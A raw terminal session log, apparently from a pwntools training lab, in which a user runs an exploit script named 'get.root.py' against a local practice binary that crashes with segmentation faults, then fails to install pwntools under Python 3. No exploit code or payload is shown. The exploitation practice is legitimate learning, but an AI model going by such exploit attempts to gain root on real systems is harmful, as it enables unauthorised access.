+[J[[1m[34m*[m] Process './intro2pwnFinal' stopped with exit code -11 (SIGSEGV) (pid 2707)[K
+[[1m[34m*[m] Got EOF while sending in interactive[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ python get.root.py 
+[?25l[?1h=[6nStarting local process './intro2pwnFinal'[K
+[26;1H[[1m[34m.[m] Starting local process './intro2pwnFinal'[K
+[J[26;5HStarting local process './intro2pwnFinal': pid 2715[K
+[J[26;1H[[1m[32m+[m] [27;1H[J[[1m[34m*[m] Switching to interactive mode[K
+[1m[31m$[m [27;3H[7m [m[J[27;3Hl[7m [m[J[27;3Hls[7m [m[J[27;3Hls[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1H[[1m[34m*[m] Got EOF while reading in interactive[K
+[1m[31m$[m [7m [m[J[27;3Hw[7m [m[J[27;3Hwh[7m [m[J[27;3Hwho[7m [m[J[27;3Hwhoa[7m [m[J[27;3Hwhoam[7m [m[J[27;3Hwhoami[7m [m[J[27;3Hwhoami[K
+[J[[1m[34m*[m] Process './intro2pwnFinal' stopped with exit code -11 (SIGSEGV) (pid 2715)[K
+[[1m[34m*[m] Got EOF while sending in interactive[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ which python3
+/usr/bin/python3
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ python3 get.f
+python3: can't open file 'get.f': [Errno 2] No such file or directory
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ /python3 get.f[K[K.root.py 
+Traceback (most recent call last):
+  File "get.root.py", line 3, in <module>
+    from pwn import *
+ModuleNotFoundError: No module named 'pwn'
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ pip3 install pwntools
+WARNING: pip is being invoked by an old script wrapper. This will fail in a future version of pip.
+Please see https://github.com/pypa/pip/issues/5599 for advice on fixing the underlying issue.
+To avoid this problem you can invoke Python with '-m pip' instead of running pip directly.
+Defaulting to user installation because normal site-packages is not writeable
+^C[31mERROR: Operation cancelled by user[0m
+^CTraceback (most recent call last):
+  File "/usr/bin/pip3", line 11, in <module>
+    sys.exit(main())
+  File "/usr/local/lib/python3.6/dist-packages/pip/__init__.py", line 14, in main
+    return _wrapper(args)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/utils/entrypoints.py", line 28, in _wrapper
+    return main(args)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/cli/main.py", line 71, in main
+    return command.main(cmd_args)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/cli/base_command.py", line 104, in main
+    return self._main(args)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/cli/base_command.py", line 221, in _main
+    self.handle_pip_version_check(options)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/cli/req_command.py", line 147, in handle_pip_version_check
+    pip_self_version_check(session, options)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/self_outdated_check.py", line 152, in pip_self_version_check
+    best_candidate = finder.find_best_candidate("pip").best_candidate
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/index/package_finder.py", line 879, in find_best_candidate
+    candidates = self.find_all_candidates(project_name)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/index/package_finder.py", line 824, in find_all_candidates
+    page_candidates = list(page_candidates_it)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/index/sources.py", line 134, in page_candidates
+    yield from self._candidates_from_page(self._link)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/index/package_finder.py", line 783, in process_project_url
+    html_page = self._link_collector.fetch_page(project_url)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/index/collector.py", line 512, in fetch_page
+    return _get_html_page(location, session=self.session)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/index/collector.py", line 422, in _get_html_page
+    resp = _get_html_response(url, session=session)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/index/collector.py", line 137, in _get_html_response
+    "Cache-Control": "max-age=0",
+  File "/usr/local/lib/python3.6/dist-packages/pip/_vendor/requests/sessions.py", line 555, in get
+    return self.request('GET', url, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_internal/network/session.py", line 449, in request
+    return super().request(method, url, *args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_vendor/requests/sessions.py", line 542, in request
+    resp = self.send(prep, **send_kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_vendor/requests/sessions.py", line 655, in send
+    r = adapter.send(request, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_vendor/cachecontrol/adapter.py", line 53, in send
+    resp = super(CacheControlAdapter, self).send(request, **kw)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_vendor/requests/adapters.py", line 449, in send
+    timeout=timeout
+  File "/usr/local/lib/python3.6/dist-packages/pip/_vendor/urllib3/connectionpool.py", line 706, in urlopen
+    chunked=chunked,
+  File "/usr/local/lib/python3.6/dist-packages/pip/_vendor/urllib3/connectionpool.py", line 382, in _make_request
+    self._validate_conn(conn)
+  File "/usr/local/lib/python3.6/dist-packages/pip/_vendor/urllib3/connectionpool.py", line 1010, in _validate_conn
+    conn.connect()
+  File "/usr/local/lib/python3.6/dist-packages/pip/_vendor/urllib3/connection.py", line 353, in connect
+    conn = self._new_conn()
+  File "/usr/local/lib/python3.6/dist-packages/pip/_vendor/urllib3/connection.py", line 170, in _new_conn
+    (self._dns_host, self.port), self.timeout, **extra_kw
+  File "/usr/local/lib/python3.6/dist-packages/pip/_vendor/urllib3/util/connection.py", line 86, in create_connection
+    sock.connect(sa)
+KeyboardInterrupt
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ exit
+logout
+Connection to pwntools.thm closed.
+
+Script done on 2025-05-08 16:04:56+03:00 [COMMAND_EXIT_CODE="1"]
